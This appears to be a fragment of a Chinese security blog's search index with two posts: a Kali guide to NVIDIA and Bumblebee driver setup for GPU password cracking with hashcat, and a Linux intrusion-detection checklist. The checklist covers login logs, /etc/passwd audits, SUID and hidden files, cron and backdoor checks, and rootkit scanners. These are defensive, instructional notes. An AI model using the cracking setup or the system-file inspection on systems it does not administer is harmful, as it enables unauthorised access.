    <content type="html"><![CDATA[<h2 id="查看主机是否存在nvidia显卡"><a href="#查看主机是否存在nvidia显卡" class="headerlink" title="查看主机是否存在nvidia显卡"></a>查看主机是否存在nvidia显卡</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-punctuation">-</span>k <span class="hljs-string">| grep -A 2 -E &quot;</span><span class="hljs-punctuation">(</span>VGA<span class="hljs-string">|3D)&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)<br>    Subsystem: Lenovo 3rd Gen Core processor Graphics Controller<br>    Kernel driver in use: i915</p></blockquote><blockquote><p>01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev a1)<br>    Subsystem: Lenovo GK208M [GeForce GT 740M]<br>    Kernel driver in use: nvidia</p></blockquote><h2 id="更新系统并重启"><a href="#更新系统并重启" class="headerlink" title="更新系统并重启"></a>更新系统并重启</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> apt dist-upgrade -y<br>reboot<br></code></pre></td></tr></table></figure><h2 id="禁用nvidia开源驱动nouveau"><a href="#禁用nvidia开源驱动nouveau" class="headerlink" title="禁用nvidia开源驱动nouveau"></a>禁用nvidia开源驱动nouveau</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/modprobe.d/blacklist-libnfc.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>在<strong>blacklist-libnfc.conf</strong>最后添加</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">blacklist</span> nouveau<br><span class="hljs-attribute">options</span> nouveau modeset=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="安装-linux-headers"><a href="#安装-linux-headers" class="headerlink" title="安装 linux-headers"></a>安装 linux-headers</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">apt install linux-headers-$(uname -r)<br></code></pre></td></tr></table></figure><h2 id="安装nvidia驱动"><a href="#安装nvidia驱动" class="headerlink" title="安装nvidia驱动"></a>安装nvidia驱动</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install nvidia-kernel-dkms nvidia-cuda-toolkit nvidia-driver<br></code></pre></td></tr></table></figure><h2 id="安装bumblebee-primus"><a href="#安装bumblebee-primus" class="headerlink" title="安装bumblebee primus"></a>安装bumblebee primus</h2><blockquote><p>“Bumblebee 致力于使 NVIDIA Optimus 在 GNU&#x2F;Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。” </p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">apt <span class="hljs-keyword">install </span><span class="hljs-keyword">bumblebee-nvidia </span>primus<br></code></pre></td></tr></table></figure><p>开机自启动bumblebee服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> bumblebeed</span><br></code></pre></td></tr></table></figure><p>添加当前用户到bumblebee组</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">adduser root bumblebee</span><br></code></pre></td></tr></table></figure><p>改变以下 bumblebee.conf 设置:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/bumblebee/bumblebee.<span class="hljs-keyword">conf</span> <br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">KeepUnusedXServer</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">Driver</span>=nvidia<br></code></pre></td></tr></table></figure><p>接下来修改 vim &#x2F;etc&#x2F;bumblebee&#x2F;xorg.conf.nvidia<br>下面这条指令可以获取显卡的总线的ID</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-punctuation">-</span>k <span class="hljs-string">| grep -A 2 -E &quot;</span><span class="hljs-punctuation">(</span>VGA<span class="hljs-string">|3D)&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)<br>    Subsystem: Lenovo 3rd Gen Core processor Graphics Controller<br>    Kernel driver in use: i915</p></blockquote><blockquote><p>01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev a1)<br>    Subsystem: Lenovo GK208M [GeForce GT 740M]<br>    Kernel driver in use: nvidia</p></blockquote><p>我的笔记本nvidia的总线ID为01:00.0</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cmake">Section <span class="hljs-string">&quot;ServerLayout&quot;</span> <br>    Identifier  <span class="hljs-string">&quot;Layout0&quot;</span> <br>    <span class="hljs-keyword">Option</span>      <span class="hljs-string">&quot;AutoAddDevices&quot;</span> <span class="hljs-string">&quot;false&quot;</span> <br>    <span class="hljs-keyword">Option</span>      <span class="hljs-string">&quot;AutoAddGPU&quot;</span> <span class="hljs-string">&quot;false&quot;</span> <br>EndSection <br><br>Section <span class="hljs-string">&quot;Device&quot;</span> <br>    Identifier  <span class="hljs-string">&quot;DiscreteNvidia&quot;</span> <br>    Driver      <span class="hljs-string">&quot;nvidia&quot;</span> <br>    VendorName  <span class="hljs-string">&quot;NVIDIA Corporation&quot;</span> <br> <br><span class="hljs-comment">#  If the X server does not automatically detect your VGA device, </span><br><span class="hljs-comment">#  you can manually set it here. </span><br><span class="hljs-comment">#  To get the BusID prop, run `lspci | egrep &#x27;VGA|3D&#x27;` and input the data </span><br><span class="hljs-comment">#  as you see in the commented example. </span><br><span class="hljs-comment">#  This Setting may be needed in some platforms with more than one </span><br><span class="hljs-comment">#  nvidia card, which may confuse the proprietary driver (e.g., </span><br><span class="hljs-comment">#  trying to take ownership of the wrong device). Also needed on Ubuntu 13.04. </span><br>    BusID <span class="hljs-string">&quot;PCI:01:00:0&quot;</span> <br> <br><span class="hljs-comment">#  Setting ProbeAllGpus to false prevents the new proprietary driver </span><br><span class="hljs-comment">#  instance spawned to try to control the integrated graphics card, </span><br><span class="hljs-comment">#  which is already being managed outside bumblebee. </span><br><span class="hljs-comment">#  This option doesn&#x27;t hurt and it is required on platforms running </span><br><span class="hljs-comment">#  more than one nvidia graphics card with the proprietary driver. </span><br><span class="hljs-comment">#  (E.g. Macbook Pro pre-2010 with nVidia 9400M + 9600M GT). </span><br><span class="hljs-comment">#  If this option is not set, the new Xorg may blacken the screen and </span><br><span class="hljs-comment">#  render it unusable (unless you have some way to run killall Xorg). </span><br>    <span class="hljs-keyword">Option</span> <span class="hljs-string">&quot;ProbeAllGpus&quot;</span> <span class="hljs-string">&quot;false&quot;</span> <br> <br>    <span class="hljs-keyword">Option</span> <span class="hljs-string">&quot;NoLogo&quot;</span> <span class="hljs-string">&quot;true&quot;</span> <br>    <span class="hljs-keyword">Option</span> <span class="hljs-string">&quot;UseEDID&quot;</span> <span class="hljs-string">&quot;false&quot;</span> <br>    <span class="hljs-keyword">Option</span> <span class="hljs-string">&quot;UseDisplayDevice&quot;</span> <span class="hljs-string">&quot;none&quot;</span> <br>EndSection <br></code></pre></td></tr></table></figure><p>把BusID这一行的注释去掉,修改里面的PCI号(你获取到独显BUSID号码),值得注意的是,获取到的ID号最后一位必须为冒号.</p><p>也就是<strong>PCI:01:00:0</strong></p><h2 id="重启检测驱动是否安装成功"><a href="#重启检测驱动是否安装成功" class="headerlink" title="重启检测驱动是否安装成功"></a>重启检测驱动是否安装成功</h2><p>我这里主要使用hashcat破解密码，这里使用hashcat测试nvidia驱动是否安装成功</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hashcat -<span class="hljs-selector-tag">I</span><br></code></pre></td></tr></table></figure><p>也可以安装 <strong>mesa-demos</strong> 并使用 <strong>glxgears</strong> 测试 <strong>Bumblebee</strong> 是否工作：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ optirun glxgears -<span class="hljs-meta">info</span><br></code></pre></td></tr></table></figure><p>如果失败，尝试下列命令:<br>64位系统:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>optirun glxspheres64<br></code></pre></td></tr></table></figure><p>32位系统:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>optirun glxspheres32<br></code></pre></td></tr></table></figure><p>如果一个内有动画的窗口出现，那么 Optimus 和 Bumblebee 正在工作。 </p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 入侵检测</title>
    <link href="/2017/08/31/2017-08-31-linux-intrusion-detection/"/>
    <url>/2017/08/31/2017-08-31-linux-intrusion-detection/</url>
    
    <content type="html"><![CDATA[<h2 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a>检查系统日志</h2><h3 id="检查系统错误登陆日志，统计IP重试次数"><a href="#检查系统错误登陆日志，统计IP重试次数" class="headerlink" title="检查系统错误登陆日志，统计IP重试次数"></a>检查系统错误登陆日志，统计IP重试次数</h3><p>这里使用了lastb命令，该命令需要root权限，可以显示所有登陆信息。这里仅仅显示的root用户的，读者可以更具实际情况自行确定，或者直接全部都显示，你会有不一样的收获，每个人的脚本都不一样，更具实际情况自行编写。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"># lastb root | <span class="hljs-type">awk</span> &#x27;&#123;print $<span class="hljs-number">3</span>&#125;&#x27; | <span class="hljs-type">sort</span> | <span class="hljs-type">uniq</span> -c | <span class="hljs-type">sort</span> -nr| <span class="hljs-type">more</span><br></code></pre></td></tr></table></figure><p>以下是我部署在阿里云上主机被多次扫描的日志</p><blockquote><p>isadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:56 - 23:56  (00:00)<br>deploy   ssh:notty    121.42.165.44    Mon Aug  7 23:54 - 23:54  (00:00)<br>deploy   ssh:notty    121.42.165.44    Mon Aug  7 23:54 - 23:54  (00:00)<br>vagrant  ssh:notty    121.42.165.44    Mon Aug  7 23:51 - 23:51  (00:00)<br>vagrant  ssh:notty    121.42.165.44    Mon Aug  7 23:51 - 23:51  (00:00)<br>Iqadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:47 - 23:47  (00:00)<br>Iqadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:47 - 23:47  (00:00)<br>debian   ssh:notty    121.42.165.44    Mon Aug  7 23:45 - 23:45  (00:00)<br>debian   ssh:notty    121.42.165.44    Mon Aug  7 23:45 - 23:45  (00:00)<br>gpadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:43 - 23:43  (00:00)<br>gpadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:43 - 23:43  (00:00)<br>oracle   ssh:notty    121.42.165.44    Mon Aug  7 23:40 - 23:40  (00:00)<br>oracle   ssh:notty    121.42.165.44    Mon Aug  7 23:40 - 23:40  (00:00)<br>tomovic  ssh:notty    121.42.165.44    Mon Aug  7 23:38 - 23:38  (00:00)<br>tomovic  ssh:notty    121.42.165.44    Mon Aug  7 23:38 - 23:38  (00:00)<br>nginx    ssh:notty    185.56.146.16    Mon Aug  7 23:37 - 23:37  (00:00)<br>nginx    ssh:notty    185.56.146.16    Mon Aug  7 23:36 - 23:36  (00:00)<br>root     ssh:notty    121.42.165.44    Mon Aug  7 23:36 - 23:36  (00:00)<br>root     ssh:notty    121.42.165.44    Mon Aug  7 23:34 - 23:34  (00:00)<br>aaa      ssh:notty    121.42.165.44    Mon Aug  7 23:12 - 23:12  (00:00)<br>aaa      ssh:notty    121.42.165.44    Mon Aug  7 23:12 - 23:12  (00:00) ‘</p></blockquote><p>通过检测，我们可以发现可以得到该恶意ip，然后添加到过滤名单中</p><blockquote><p>[root@sanduo ~]#  lastb root | awk ‘{print $3}’ | sort | uniq -c | sort -nr| more<br>     78 218.244.128.200<br>     32 140.205.225.199<br>     32 140.205.201.37<br>     24 140.205.201.32<br>     22 140.205.225.188<br>     22 140.205.201.42<br>     16 140.205.225.204<br>     16 140.205.225.201<br>     16 140.205.225.200<br>     16 140.205.225.193<br>     16 140.205.225.186<br>     16 140.205.225.183<br>     16 140.205.201.30<br>     12 129.144.188.171</p></blockquote><h2 id="检查系统用户"><a href="#检查系统用户" class="headerlink" title="检查系统用户"></a>检查系统用户</h2><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span><span class="hljs-operator">、</span>cat <span class="hljs-regexp">/etc/</span>passwd 查看是否有异常的系统用户<br><br><span class="hljs-number">2</span><span class="hljs-operator">、</span>grep “<span class="hljs-number">0</span>” <span class="hljs-regexp">/etc/</span>passwd 查看是否产生了新用户，<span class="hljs-type">UID和GID为0的用户</span><br><br><span class="hljs-number">3</span><span class="hljs-operator">、</span>ls <span class="hljs-operator">-</span>l <span class="hljs-regexp">/etc/</span>passwd 查看passwd的修改时间，判断是否在不知的情况下添加用户<br><br><span class="hljs-number">4</span><span class="hljs-operator">、</span>查看是否存在特权用户 awk <span class="hljs-operator">-</span><span class="hljs-type">F</span><span class="hljs-string">&quot;:&quot;</span> &#x27;&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$3</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)&#123;print <span class="hljs-variable">$1</span>&#125;&#125;&#x27; <span class="hljs-regexp">/etc/</span>passwd<br><br><span class="hljs-number">5</span><span class="hljs-operator">、</span>查看是否存在空口令帐户 awk <span class="hljs-operator">-</span><span class="hljs-type">F</span>: &#x27;&#123;<span class="hljs-keyword">if</span>(length(<span class="hljs-variable">$2</span>)<span class="hljs-operator">==</span><span class="hljs-number">0</span>) &#123;print <span class="hljs-variable">$1</span>&#125;&#125;&#x27; <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h2 id="检查系统异常进程"><a href="#检查系统异常进程" class="headerlink" title="检查系统异常进程"></a>检查系统异常进程</h2><blockquote><p>1、注意UID为0的进程 使用ps -ef命令查看进程<br>2、察看该进程所打开的端口和文件 lsof -p pid命令查看<br>3、检查隐藏进程<br>“linux即文件，所有的进程在&#x2F;proc均有记录，需要注意，这里的信息是最详细的，一些系统指令可能会出现被替换的的问题。”</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ps -ef | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> &gt;1 <span class="hljs-built_in">ls</span> /proc |<span class="hljs-built_in">sort</span> -n|<span class="hljs-built_in">uniq</span> &gt;2 diff 1 2</span><br></code></pre></td></tr></table></figure><h2 id="检查系统异常文件"><a href="#检查系统异常文件" class="headerlink" title="检查系统异常文件"></a>检查系统异常文件</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># <span class="hljs-keyword">find</span> / -uid <span class="hljs-number">0</span> -perm <span class="hljs-number">4000</span> -<span class="hljs-keyword">print</span><br># <span class="hljs-keyword">find</span> / -<span class="hljs-keyword">size</span> +<span class="hljs-number">10000</span>k –<span class="hljs-keyword">print</span><br># <span class="hljs-keyword">find</span> / -name “…” –<span class="hljs-keyword">print</span><br># <span class="hljs-keyword">find</span> / -name “.. ” –<span class="hljs-keyword">print</span><br># <span class="hljs-keyword">find</span> / -name “. ” –<span class="hljs-keyword">print</span><br># <span class="hljs-keyword">find</span> / -name ” ” –<span class="hljs-keyword">print</span><br></code></pre></td></tr></table></figure><blockquote><ul><li>注意SUID文件，可疑大于10M和空格文件</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">find / -name core -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -l &#123;&#125; \ （检查系统中的core文件）</span><br></code></pre></td></tr></table></figure><blockquote><p>find -perm 高级用法</p></blockquote><pre><code>-perm mode:文件许可正好符合mode-perm +mode:文件许可部分符合mode-perm -mode: 文件许可完全符合mode</code></pre><h2 id="检查系统文件的完整性"><a href="#检查系统文件的完整性" class="headerlink" title="检查系统文件的完整性"></a>检查系统文件的完整性</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">rpm –qf /bin/ls</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">rpm -qf /bin/login</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">md5sum</span> –b 文件名</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">md5sum</span> –t 文件名</span><br></code></pre></td></tr></table></figure><h2 id="检查系统安装包的完整性（这里主要检验的rpm包）"><a href="#检查系统安装包的完整性（这里主要检验的rpm包）" class="headerlink" title="检查系统安装包的完整性（这里主要检验的rpm包）"></a>检查系统安装包的完整性（这里主要检验的rpm包）</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># rpm –Va 输出格式：</span><br>S – File size differs<br>M – Mode differs (permissions)<br><span class="hljs-number">5</span> – MD5 sum differs<br>D – Device <span class="hljs-keyword">number</span> mismatch<br>L – readLink path mismatch<br>U – <span class="hljs-keyword">user</span> <span class="hljs-title">ownership</span> differs<br>G – <span class="hljs-keyword">group</span> <span class="hljs-title">ownership</span> differs<br>T – modification time differs<br>注意相关的 /sbin, /bin, /usr/sbin, <span class="hljs-keyword">and</span> /usr/bin<br></code></pre></td></tr></table></figure><blockquote><p>对于不同的linux系统，你需要根据实际情况进行检查。</p></blockquote><h2 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ip <span class="hljs-built_in">link</span> | grep PROMISC（正常网卡不该在promisc混杂模式，可能存在sniffer）</span><br><br>网卡处于混杂模式，这样通过网卡的流量都会被监听<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">lsof –i 如查看所有打开80端口的进程： lsof –i :80</span><br><br>查看恶意程序开放的端口<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">netstat –nap（察看不正常打开的TCP/UDP端口)</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">arp –a 查看流量在内网是否被劫持</span><br></code></pre></td></tr></table></figure><h2 id="检查系统计划任务"><a href="#检查系统计划任务" class="headerlink" title="检查系统计划任务"></a>检查系统计划任务</h2><blockquote><ul><li>注意root和UID是0的schedule</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">crontab –u root –l</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/crontab</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span> /etc/cron.*</span><br></code></pre></td></tr></table></figure><h2 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/crontab</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span> /var/spool/cron/</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/rc.d/rc.local</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span> /etc/rc.d <span class="hljs-comment"># ls /etc/rc3.d</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">find / -<span class="hljs-built_in">type</span> f -perm 4000</span><br></code></pre></td></tr></table></figure><h2 id="检查系统服务"><a href="#检查系统服务" class="headerlink" title="检查系统服务"></a>检查系统服务</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># chkconfig —list</span><br><br><span class="hljs-meta"># rpcinfo -p（查看RPC服务）</span><br></code></pre></td></tr></table></figure><p>这个主要检测的是启动服务，目前在centos7以上都采用systemd 来管理相应的服务。Systemd是一个系统管理守护进程、工具和库的集合，用于取代System V初始进程。Systemd的功能是用于集中管理和配置类UNIX系统。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">查看所有的可用单元<br><br><span class="hljs-meta"># systemctl list-unit-files</span><br></code></pre></td></tr></table></figure><h2 id="检查rootkit"><a href="#检查rootkit" class="headerlink" title="检查rootkit"></a>检查rootkit</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># rkhunter -c</span><br><br><span class="hljs-meta"># chkrootkit -q</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operations</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
